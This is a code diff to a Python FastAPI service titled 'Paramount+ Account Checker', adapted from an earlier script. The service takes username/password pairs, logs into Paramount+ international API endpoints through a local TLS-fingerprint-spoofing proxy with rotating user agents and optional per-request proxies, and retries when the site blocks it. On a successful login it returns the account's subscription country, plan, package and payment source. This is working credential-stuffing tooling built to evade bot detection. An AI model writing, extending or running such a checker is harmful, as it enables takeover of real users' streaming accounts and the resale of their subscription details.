@@ -20,7 +20,6 @@ class CheckRequest(BaseModel):
 class CheckResponse(BaseModel):
     success: bool
     message: Optional[str] = None
-    # Account details if successful
     device_id: Optional[str] = None
     country_code: Optional[str] = None
     country_name: Optional[str] = None
@@ -34,12 +33,24 @@ class CheckResponse(BaseModel):
 # ------------------------------------------------------------------------------
 # FastAPI app
 # ------------------------------------------------------------------------------
-app = FastAPI(title="Paramount+ Account Checker")
+app = FastAPI(title="Paramount+ Account Checker (TLSProxy)")
 
 # ------------------------------------------------------------------------------
-# Constants & configurations
+# TLSProxy constants
 # ------------------------------------------------------------------------------
-# Random User-Agent list (fallback if fake-useragent is not installed)
+TLS_PROXY_URL = "http://127.0.0.1:9000"
+CHID = "HelloIOS_16"
+H1_ORDER = (
+    "sec-ch-ua,sec-ch-ua-mobile,sec-ch-ua-platform,upgrade-insecure-requests,"
+    "user-agent,accept,sec-fetch-site,sec-fetch-mode,sec-fetch-user,sec-fetch-dest,"
+    "accept-encoding,accept-language"
+)
+H2_ORDER = "auto"
+H2_SETTINGS = '{"mode": "auto"}'
+
+# ------------------------------------------------------------------------------
+# User‑Agent & country map (same as before)
+# ------------------------------------------------------------------------------
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
@@ -48,7 +59,6 @@ USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
 ]
 
-# Country translation map (from the original script)
 COUNTRY_MAP = {
     "AF": "Afganistan 🇦🇫",
     "AX": "Åland Islands 🇦🇽",
@@ -302,40 +312,26 @@ COUNTRY_MAP = {
 # Helper functions
 # ------------------------------------------------------------------------------
 def generate_device_id() -> str:
-    """Generate an 8-byte hex string (lowercase)."""
-    return secrets.token_hex(8).lower()  # 8 bytes -> 16 hex chars
+    return secrets.token_hex(8).lower()
 
 def get_random_user_agent() -> str:
-    """Return a random User-Agent string."""
-    # If you have 'fake-useragent' installed, you could use it:
-    # from fake_useragent import UserAgent
-    # return UserAgent().random
     return secrets.choice(USER_AGENTS)
 
 def parse_proxy(proxy_str: str):
-    """
-    Parse a proxy string of format 'host:port:user:pass'
-    Returns (proxy_url, userpass, ipport) or raises ValueError.
-    """
-    # The original regex: ^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$  -> userpass
-    # and ^([^:]+:[^:]+) -> ipport
-    # So we assume format: "host:port:user:pass"
+    """Parse 'host:port:user:pass' -> (proxy_url, userpass, ipport)."""
     parts = proxy_str.split(':')
     if len(parts) < 4:
         raise ValueError("Proxy must be in format 'host:port:user:pass'")
-    # Extract host and port as first two parts (could have IPv6, but ignore for simplicity)
     ipport = f"{parts[0]}:{parts[1]}"
-    # userpass is the rest joined by ':' (in case password has colon)
     userpass = ':'.join(parts[2:])
     proxy_url = f"http://{userpass}@{ipport}"
     return proxy_url, userpass, ipport
 
-def get_common_headers(user_agent: str, device_id: str) -> dict:
-    """Build headers shared across both requests."""
-    # Hardcoded from original script (Traceparent, Tracestate, Newrelic)
+def get_common_headers(user_agent: str) -> dict:
+    """Base headers sent to TLSProxy (mirrors the original script)."""
     return {
         "Host": "www.intl.paramountplus.com",
-        "Cookie": f"CBS_DEVICEID={device_id}",
+        "Cookie": "CBS_DEVICEID=",              # exactly as in script
         "Cache-Control": "max-age=0",
         "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
         "Tracestate": "2321606@nr=0-2-2936348-766585785-10cc66f212114532----1763113514852",
@@ -353,45 +349,57 @@ def get_common_headers(user_agent: str, device_id: str) -> dict:
         "Sec-Ch-Ua-Platform": '"Windows"',
     }
 
+def build_tls_proxy_headers(
+    target_url: str,
+    target_method: str,
+    user_agent: str,
+    proxy_override: Optional[str] = None
+) -> dict:
+    """Build the full headers for the TLSProxy request."""
+    headers = get_common_headers(user_agent)
+    # TLSProxy specific headers
+    headers["x-tp-h1order"] = H1_ORDER
+    headers["x-tp-h2order"] = H2_ORDER
+    headers["x-tp-url"] = target_url
+    headers["x-tp-method"] = target_method
+    headers["x-tp-h2settings"] = H2_SETTINGS
+    headers["x-tp-chid"] = CHID
+    if proxy_override:
+        headers["x-tp-proxy"] = proxy_override
+    return headers
+
+
 # ------------------------------------------------------------------------------
-# Core check function (async)
+# Core check function (now using TLSProxy)
 # ------------------------------------------------------------------------------
 async def perform_check(request: CheckRequest) -> CheckResponse:
-    # 1. Generate device ID
     device_id = generate_device_id()
-
-    # 2. Random User-Agent
     user_agent = get_random_user_agent()
 
-    # 3. Proxy handling
-    proxy_url = None
+    # Build the proxy URL for x-tp-proxy if needed
+    tp_proxy_override = None
     if request.use_proxy and request.proxy:
         try:
-            proxy_url, _, _ = parse_proxy(request.proxy)
+            tp_proxy_override, _, _ = parse_proxy(request.proxy)
         except ValueError as e:
             return CheckResponse(success=False, message=f"Proxy parsing error: {e}")
 
-    # Use a session to persist cookies across login and status requests
-    async with httpx.AsyncClient(proxy=proxy_url, timeout=120.0, http2=True) as client:
-        # ---------- First request: POST login ----------
+    # We use a single client for both requests (connection reuse is fine)
+    async with httpx.AsyncClient(timeout=120.0, http2=True) as client:
+        # ---------- First request: login (POST) ----------
         login_url = (
             "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json"
             "?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
         )
-        login_headers = get_common_headers(user_agent, device_id)
-        login_data = {
-            "j_username": request.username,
-            "j_password": request.password,
-            "deviceId": device_id,
-        }
+        login_headers = build_tls_proxy_headers(login_url, "POST", user_agent, tp_proxy_override)
+        login_body = f"j_username={request.username}&j_password={request.password}&deviceId={device_id}"
 
-        # Retry loop for 500/403/406 (original uses labels)
         max_retries = 3
         for attempt in range(max_retries):
             try:
-                resp = await client.post(login_url, data=login_data, headers=login_headers)
+                # TLSProxy expects the outer method to match x-tp-method, so we POST
+                resp = await client.post(TLS_PROXY_URL, content=login_body, headers=login_headers)
             except httpx.HTTPError as e:
-                # Network error - maybe retry
                 if attempt == max_retries - 1:
                     return CheckResponse(success=False, message=f"Login request failed: {e}")
                 continue
@@ -400,27 +408,26 @@ async def perform_check(request: CheckRequest) -> CheckResponse:
             if status in (500, 403, 406):
                 if attempt == max_retries - 1:
                     return CheckResponse(success=False, message=f"Login retry exhausted, last status {status}")
-                continue  # retry
-            break  # not a retry status, proceed
+                continue
+            break
 
-        # Check login response
         text = resp.text
         if "Invalid username/password pair" in text or '"status":400,"error":"Bad Request"' in text:
             return CheckResponse(success=False, message="Invalid username/password or bad request")
         if "userId" not in text:
             return CheckResponse(success=False, message="Login response missing userId")
 
-        # ---------- Second request: GET login status ----------
+        # ---------- Second request: status (GET) ----------
         status_url = (
             "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json"
             "?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
         )
-        status_headers = get_common_headers(user_agent, device_id)
-        # (Cookies from the session will be sent automatically)
+        status_headers = build_tls_proxy_headers(status_url, "GET", user_agent, tp_proxy_override)
 
         for attempt in range(max_retries):
             try:
-                resp_status = await client.get(status_url, headers=status_headers)
+                # Outer method is GET (as x-tp-method is GET)
+                resp_status = await client.get(TLS_PROXY_URL, headers=status_headers)
             except httpx.HTTPError as e:
                 if attempt == max_retries - 1:
                     return CheckResponse(success=False, message=f"Status request failed: {e}")
@@ -433,21 +440,16 @@ async def perform_check(request: CheckRequest) -> CheckResponse:
                 continue
             break
 
-        # Check status response
         status_text = resp_status.text
-        # Custom keycheck: contains "NEW_FREE_PACKAGE" or "\"planType\":null,"
-        if "NEW_FREE_PACKAGE" not in status_text and '"planType":null,' not in status_text:
-            # Not necessarily a failure; might still have data, but we'll proceed.
-            # The original script had banIfNoMatch=False, so it doesn't fail.
-            pass
+        # The original script has a custom keycheck with banIfNoMatch=False,
+        # so we don't fail even if "NEW_FREE_PACKAGE" or '"planType":null,' are missing.
 
-        # Parse JSON response
+        # Parse JSON
         try:
-            data = resp_status.json()
+            data = json.loads(status_text)
         except json.JSONDecodeError:
             return CheckResponse(success=False, message="Status response is not valid JSON")
 
-        # Extract fields (using JSON path, fallback to empty string)
         subscription_country = data.get("subscriptionCountry", "") or ""
         product_name = data.get("productName", "") or ""
         plan_type = data.get("planType", "") or ""
@@ -455,10 +457,8 @@ async def perform_check(request: CheckRequest) -> CheckResponse:
         package_code = data.get("packageCode", "") or ""
         package_source = data.get("packageSource", "") or ""
 
-        # Translate country
         country_name = COUNTRY_MAP.get(subscription_country, subscription_country)
 
-        # Build successful response
         return CheckResponse(
             success=True,
             message="Account details retrieved",
@@ -472,6 +472,7 @@ async def perform_check(request: CheckRequest) -> CheckResponse:
             payment_method=package_source,
         )
 
+
 # ------------------------------------------------------------------------------
 # FastAPI endpoint
 # ------------------------------------------------------------------------------
@@ -483,13 +484,7 @@ async def check_account(req: CheckRequest):
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-# ------------------------------------------------------------------------------
-# Optional: health check
-# ------------------------------------------------------------------------------
+
 @app.get("/health")
 async def health():
     return {"status": "ok"}
-
-# ------------------------------------------------------------------------------
-# Run with: uvicorn main:app --reload
-# ------------------------------------------------------------------------------
